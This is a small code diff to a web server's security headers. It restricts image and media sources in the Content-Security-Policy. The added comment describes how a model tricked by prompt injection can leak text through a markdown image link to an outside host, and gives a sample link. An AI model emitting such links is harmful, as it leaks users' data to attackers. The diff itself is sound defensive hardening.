@@ -128,7 +128,11 @@ export function createApp({ port, staticFiles }) {
     // a response it did not get CORS permission for, and cannot read a frame's
     // document across origins, but there is no reason to be framed at all.
     res.setHeader('X-Frame-Options', 'DENY');
-    res.setHeader('Content-Security-Policy', "frame-ancestors 'none'");
+    // img-src and media-src: rendered markdown (a Claude reply, a CLAUDE.md)
+    // can contain ![x](https://host/?d=...), and without these the browser
+    // fetches it: an outbound request, and the classic exfiltration channel
+    // for text a model was tricked into writing. Only our own origin and data:.
+    res.setHeader('Content-Security-Policy', "frame-ancestors 'none'; img-src 'self' data:; media-src 'self'");
     next();
   });
 
